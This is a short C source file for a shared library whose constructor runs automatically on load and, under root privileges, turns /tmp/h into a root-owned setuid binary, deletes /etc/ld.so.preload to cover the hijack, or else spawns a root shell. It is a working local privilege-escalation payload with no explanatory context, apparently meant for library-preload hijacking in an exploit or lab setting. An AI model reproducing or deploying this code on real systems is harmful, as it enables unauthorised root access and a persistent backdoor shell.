#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stdio.h>

__attribute__ ((__constructor__))
void upgrade(void){
    if(geteuid() == 0 ){
        if (access("/tmp/h", F_OK) != -1) {
            chown("/tmp/h", 0, 0);
            chmod("/tmp/h", S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH );
            unlink("/etc/ld.so.preload");
        }
        else {
            execl("/bin/sh", "/bin/sh", NULL);
        }
    }
}
